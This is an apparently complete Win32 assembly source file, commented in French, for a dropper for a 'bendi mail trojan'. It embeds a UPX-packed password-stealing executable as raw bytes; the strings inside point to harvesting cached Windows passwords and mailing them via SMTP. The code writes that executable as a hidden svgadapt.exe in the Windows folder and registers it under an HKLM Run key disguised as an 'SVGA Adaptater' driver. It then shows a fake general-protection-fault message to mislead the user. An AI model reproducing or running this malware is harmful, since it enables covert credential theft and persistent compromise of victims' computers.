; ****************************************************************
;
; support pour le cheval de troie " bendi mail trojan"
;
; - copie le cheval de troie sous le nom de svgadapt.exe dans le repertoire de windows
; - le met en fichier cache
; - creer une cle dans la base de registres pour qu'il s'execute a chaque demarage
; - affiche un message d'erreur fictif !
;
;******************************************************************

.586P
LOCALS
JUMPS
.MODEL FLAT , STDCALL

include .\inc\win32.inc			
includelib .\lib\win32.lib


extern ExitProcess 	: proc 
extern RegSetValueExA	: proc
extern RegOpenKeyA : proc
extern CreateFileA : proc
extern CloseHandle : proc
extern WriteFile : proc
extern RegCloseKey : proc
extern GetWindowsDirectoryA : proc
extern lstrcatA	: proc
extern lstrlenA : proc
extern MessageBoxA : proc

.DATA

windir		db	50 dup (0)
file		db	'\svgadapt.exe',0


getpwd	  db 77,90,80,0,2,0,0,0,4,0,15,0,255,255,0,0	; D:\Project\getpwd.exe 5120 bytes

  db 184,0,0,0,0,0,0,0,64,0,26,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0
  db 186,16,0,14,31,180,9,205,33,184,1,76,205,33,144,144
  db 84,104,105,115,32,112,114,111,103,114,97,109,32,109,117,115
  db 116,32,98,101,32,114,117,110,32,117,110,100,101,114,32,87
  db 105,110,51,50,13,10,36,55,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 80,69,0,0,76,1,3,0,109,41,9,154,0,0,0,0
  db 0,0,0,0,224,0,143,129,11,1,2,25,0,16,0,0
  db 0,16,0,0,0,80,0,0,192,100,0,0,0,96,0,0
  db 0,112,0,0,0,0,64,0,0,16,0,0,0,2,0,0
  db 1,0,0,0,0,0,0,0,4,0,0,0,0,0,0,0
  db 0,128,0,0,0,4,0,0,0,0,0,0,2,0,0,0
  db 0,0,16,0,0,32,0,0,0,0,16,0,0,16,0,0
  db 0,0,0,0,16,0,0,0,0,0,0,0,0,0,0,0
  db 0,112,0,0,16,1,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,85,80,88,48,0,0,0,0
  db 0,80,0,0,0,16,0,0,0,0,0,0,0,4,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,128,0,0,224
  db 85,80,88,49,0,0,0,0,0,16,0,0,0,96,0,0
  db 0,8,0,0,0,4,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,64,0,0,224,85,80,88,50,0,0,0,0
  db 0,16,0,0,0,112,0,0,0,2,0,0,0,12,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,64,0,0,192
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,10,0,36,73,110,102,111,58,32,84,104,105,115,32
  db 102,105,108,101,32,105,115,32,112,97,99,107,101,100,32,119
  db 105,116,104,32,116,104,101,32,85,80,88,32,101,120,101,99
  db 117,116,97,98,108,101,32,112,97,99,107,101,114,32,104,116
  db 116,112,58,47,47,117,112,120,46,116,115,120,46,111,114,103
  db 32,36,10,0,36,73,100,58,32,85,80,88,32,49,46,48
  db 50,32,67,111,112,121,114,105,103,104,116,32,40,67,41,32
  db 49,57,57,54,45,50,48,48,48,32,116,104,101,32,85,80
  db 88,32,84,101,97,109,46,32,65,108,108,32,82,105,103,104
  db 116,115,32,82,101,115,101,114,118,101,100,46,32,36,10,0
  db 85,80,88,33,12,9,2,9,55,179,169,133,145,238,117,177
  db 229,66,0,0,179,4,0,0,0,32,0,0,38,0,0,36
  db 43,183,183,255,106,1,106,0,232,0,0,4,228,6,104,128
  db 0,8,106,3,1,253,253,143,253,104,0,32,64,24,252,131
  db 248,255,15,133,229,3,0,20,117,20,64,217,230,216,179,38
  db 255,0,54,5,38,48,117,15,123,237,199,126,14,163,213,38
  db 55,5,62,104,19,1,6,4,56,103,150,31,236,185,21,8
  db 104,195,36,64,1,14,201,222,206,254,56,106,50,104,242,35
  db 26,104,104,0,117,197,14,231,219,254,155,110,116,182,131,192
  db 12,139,24,139,27,1,83,19,80,127,155,59,251,162,80,104
  db 36,36,155,240,118,191,2,26,98,163,159,183,117,191,115,20
  db 171,116,130,102,199,5,163,11,2,27,25,25,181,95,246,251
  db 86,102,163,165,115,179,36,88,15,132,89,255,0,189,223,221
  db 147,92,137,29,167,28,106,16,104,55,255,53,73,123,103,54
  db 247,41,44,78,41,47,103,4,104,81,38,28,253,153,145,3
  db 74,18,137,27,129,61,207,110,23,254,30,50,50,48,32,44
  db 253,254,20,104,85,241,4,71,230,6,178,99,110,234,254,68
  db 205,28,63,97,7,251,12,53,189,254,84,104,106,68,12,201
  db 65,50,165,136,120,65,50,33,147,136,96,33,147,12,201,67
  db 51,164,62,228,65,50,27,254,253,51,53,52,59,144,135,108
  db 238,253,52,36,214,23,115,37,19,182,104,148,18,195,176,3
  db 249,76,216,80,56,157,242,35,158,43,187,146,138,119,18,100
  db 104,153,144,111,66,81,56,36,62,228,185,178,43,43,18,24
  db 117,132,131,124,38,5,10,32,104,171,119,66,14,36,39,232
  db 252,203,252,201,132,29,242,187,252,177,68,163,144,230,37,7
  db 134,50,49,118,223,145,28,210,218,2,80,5,246,159,157,116
  db 106,71,179,191,26,6,2,131,196,228,238,238,221,4,233,50
  db 81,128,61,184,27,10,116,27,117,1,104,184,125,247,247,167
  db 116,214,235,220,198,5,23,1,195,200,48,139,93,8,128,59
  db 255,92,246,45,163,26,46,83,42,68,3,67,235,227,51,190
  db 251,255,251,192,201,194,4,0,41,96,139,85,8,15,183,74
  db 2,137,13,155,36,65,141,90,8,81,239,222,65,232,48,151
  db 80,234,161,9,34,102,139,82,2,246,247,199,254,102,3,194
  db 198,0,92,64,48,90,2,3,218,131,195,57,4,65,81,49
  db 177,119,236,177,193,234,89,3,68,1,13,52,57,182,253,222
  db 90,3,180,13,131,5,10,2,97,114,8,182,100,100,164,251
  db 37,212,48,64,5,216,220,224,100,100,100,100,228,232,240,244
  db 200,115,100,100,248,252,0,49,8,200,200,200,200,16,20,24
  db 28,200,200,200,200,32,36,40,44,204,200,200,200,48,52,56
  db 60,255,8,32,194,0,98,101,110,100,105,46,7,34,0,235
  db 105,110,105,56,77,97,255,199,122,243,105,108,32,115,32,98
  db 121,32,64,32,116,114,111,106,97,110,32,33,0,191,189,185
  db 255,78,111,109,32,100,101,32,111,114,20,25,32,114,101,39
  db 97,117,58,32,0,187,239,222,220,65,100,10,11,32,73,80
  db 12,76,105,115,116,101,38,115,32,183,221,230,218,112,97,20
  db 39,27,103,18,114,233,11,58,13,71,152,33,220,10,0,2
  db 69,126,109,172,173,109,55,46,115,107,51,101,6,103,103,184
  db 216,248,1,130,72,69,76,79,32,14,103,55,52,46,92,160
  db 102,105,166,46,99,19,210,77,65,73,253,219,183,255,76,32
  db 70,82,79,77,58,106,101,27,49,50,64,119,5,97,100,111
  db 111,46,102,114,252,200,254,223,29,82,67,80,84,32,84,79
  db 58,98,120,116,64,57,68,65,84,65,12,186,119,99,22,46
  db 5,81,85,73,84,6,1,175,144,21,136,0,42,162,144,65
  db 4,84,128,13,40,3,83,113,217,28,140,212,32,1,82,130
  db 149,138,255,246,101,114,83,2,118,105,99,101,80,114,111,99
  db 176,146,253,82,177,23,108,151,99,112,121,110,65,10,221,238
  db 254,239,9,67,108,111,115,101,72,97,110,100,108,101,12,114
  db 101,97,56,70,105,102,11,246,174,11,25,69,120,105,116,59
  db 92,153,84,252,255,205,8,33,87,78,101,116,69,110,117,109
  db 67,97,99,104,101,100,80,233,186,86,177,244,119,33,33,161
  db 126,240,125,123,187,237,71,32,77,51,97,103,68,131,116,84
  db 105,109,91,247,96,173,136,9,19,66,111,120,22,75,98,108
  db 102,27,246,96,23,87,97,105,47,102,172,187,118,251,159,16
  db 99,111,110,110,101,99,116,8,98,105,154,36,83,65,141,162
  db 197,254,83,116,97,114,116,117,112,11,180,119,173,108,95,123
  db 11,186,29,114,41,118,40,206,110,203,111,107,95,110,116,111
  db 97,104,5,110,115,6,108,222,110,238,230,36,195,107,101,74
  db 96,116,104,236,116,110,97,158,240,78,214,119,12,98,121,14
  db 84,80,69,254,31,242,95,76,1,4,0,109,41,9,154,224
  db 0,143,129,11,1,2,25,0,6,190,193,6,235,12,14,20
  db 16,3,32,12,64,200,97,20,207,11,2,0,200,4,198,134
  db 93,54,80,12,2,56,51,16,151,203,152,77,9,56,48,170
  db 2,16,178,12,36,64,208,216,151,176,15,67,79,68,69,215
  db 235,6,35,100,166,162,91,182,96,188,39,241,41,233,190,199
  db 8,162,12,192,46,105,100,216,32,12,182,69,97,39,48,3
  db 20,39,32,12,242,3,114,101,108,111,99,64,36,110,251,77
  db 217,24,39,80,4,68,49,3,65,125,0,0,0,0,0,128
  db 4,0,255,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 96,190,0,96,64,0,141,190,0,176,255,255,87,131,205,255
  db 235,16,144,144,144,144,144,144,138,6,70,136,7,71,1,219
  db 117,7,139,30,131,238,252,17,219,114,237,184,1,0,0,0
  db 1,219,117,7,139,30,131,238,252,17,219,17,192,1,219,115
  db 239,117,9,139,30,131,238,252,17,219,115,228,49,201,131,232
  db 3,114,13,193,224,8,138,6,70,131,240,255,116,116,137,197
  db 1,219,117,7,139,30,131,238,252,17,219,17,201,1,219,117
  db 7,139,30,131,238,252,17,219,17,201,117,32,65,1,219,117
  db 7,139,30,131,238,252,17,219,17,201,1,219,115,239,117,9
  db 139,30,131,238,252,17,219,115,228,131,193,2,129,253,0,243
  db 255,255,131,209,1,141,20,47,131,253,252,118,15,138,2,66
  db 136,7,71,73,117,247,233,99,255,255,255,144,139,2,131,194
  db 4,137,7,131,199,4,131,233,4,119,241,1,207,233,76,255
  db 255,255,94,137,247,185,57,0,0,0,138,7,71,44,232,60
  db 1,119,247,128,63,0,117,242,139,7,138,95,4,102,193,232
  db 8,193,192,16,134,196,41,248,128,235,232,1,240,137,7,131
  db 199,5,137,216,226,217,141,190,0,64,0,0,139,7,9,192
  db 116,60,139,95,4,141,132,48,0,96,0,0,1,243,80,131
  db 199,8,255,150,100,96,0,0,149,138,7,71,8,192,116,220
  db 137,249,87,72,242,174,85,255,150,104,96,0,0,9,192,116
  db 7,137,3,131,195,4,235,225,255,150,108,96,0,0,97,233
  db 236,169,255,255,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,140,112,0,0
  db 100,112,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 153,112,0,0,116,112,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,161,112,0,0,124,112,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,172,112,0,0,132,112,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,184,112,0,0,198,112,0,0,214,112,0,0
  db 0,0,0,0,228,112,0,0,0,0,0,0,254,112,0,0
  db 0,0,0,0,8,113,0,0,0,0,0,0,75,69,82,78
  db 69,76,51,50,46,68,76,76,0,77,80,82,46,100,108,108
  db 0,85,83,69,82,51,50,46,100,108,108,0,87,83,79,67
  db 75,51,50,46,100,108,108,0,0,0,76,111,97,100,76,105
  db 98,114,97,114,121,65,0,0,71,101,116,80,114,111,99,65
  db 100,100,114,101,115,115,0,0,69,120,105,116,80,114,111,99
  db 101,115,115,0,0,0,87,78,101,116,69,110,117,109,67,97
  db 99,104,101,100,80,97,115,115,119,111,114,100,115,0,0,0
  db 83,101,116,84,105,109,101,114,0,0,98,105,110,100,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0
  db 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0

temp 	dd 0

khandle	dd 0

key	db	'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',0

keyname	db	'Run',0

valuename	db	'SVGA Adaptater',0

titre	db	'défaillance de protection générale',0

message	db 100,97,110,115,32,108,101,32,109,111,100,117,108,101,32,75
  db 82,78,76,51,56,54,46,69,88,69,32,224,32,48,48,48
  db 49,58,48,48,48,48,56,53,101,54,46,13,10,82,101,103
  db 105,115,116,114,101,115,32,58,13,10,69,65,88,61,48,48
  db 48,48,52,99,48,48,32,67,83,61,48,49,49,55,32,69
  db 73,80,61,48,48,48,48,56,53,101,54,32,69,70,76,71
  db 83,61,48,48,48,49,48,50,49,50,13,10,69,66,88,61
  db 48,48,53,100,56,99,100,53,32,83,83,61,48,49,51,102
  db 32,69,83,80,61,48,48,54,100,102,101,50,97,32,69,66
  db 80,61,48,48,54,100,102,101,50,101,13,10,69,67,88,61
  db 56,49,54,51,53,53,100,52,32,68,83,61,48,49,50,102
  db 32,69,83,73,61,56,49,54,51,53,53,98,52,32,70,83
  db 61,51,52,52,102,13,10,69,68,88,61,56,49,54,51,53
  db 54,49,52,32,69,83,61,48,49,51,102,32,69,68,73,61
  db 56,49,54,53,98,50,99,48,32,71,83,61,48,48,48,48
  db 13,10,79,99,116,101,116,115,32,224,32,67,83,32,58,32
  db 69,73,80,32,58,13,10,56,55,32,53,101,32,102,99,32
  db 56,101,32,53,101,32,102,101,32,53,48,32,57,99,32,53
  db 56,32,102,54,32,99,52,32,48,50,32,53,56,32,55,53
  db 32,48,49,32,102,98,32,13,10,69,116,97,116,32,100,101
  db 32,108,97,32,112,105,108,101,32,58,13,10,48,49,51,102
  db 48,48,48,48,32,49,48,48,48,102,102,55,57,32,48,49
  db 51,55,48,48,52,48,32,48,97,56,54,48,48,48,48,32
  db 56,101,57,51,48,48,48,48,32,98,50,99,48,98,102,102
  db 56,32,53,53,98,52,56,49,54,53,32,48,48,48,48,56
  db 49,54,51,32,54,100,52,55,48,48,53,100,32,52,53,48
  db 48,51,49,51,53,32,48,48,48,48,52,53,53,56,32,48
  db 48,48,48,48,48,48,48,32,48,48,48,48,48,48,48,48
  db 32,48,48,48,48,48,48,48,48,32,48,48,48,48,48,48
  db 48,48,32,48,48,48,48,48,48,48,48,32,39


.CODE

main:						

call GetWindowsDirectoryA, offset windir , 50

call lstrcatA, offset windir, offset file

call CreateFileA, offset windir, GENERIC_WRITE	, 0 , 0 , CREATE_ALWAYS , FILE_ATTRIBUTE_HIDDEN , 0

push eax

call WriteFile, eax , offset getpwd , 5120 , offset temp , 0

pop ebx

call CloseHandle, ebx

call RegOpenKeyA, HKEY_LOCAL_MACHINE , offset key , offset khandle

lea ebx,file+1

push ebx

call  lstrlenA , ebx

pop ebx

call RegSetValueExA, khandle, offset valuename ,0, REG_SZ , ebx , eax

call RegCloseKey , khandle

call MessageBoxA, 0 , offset message, offset titre, MB_ICONSTOP	+ MB_SYSTEMMODAL	

end main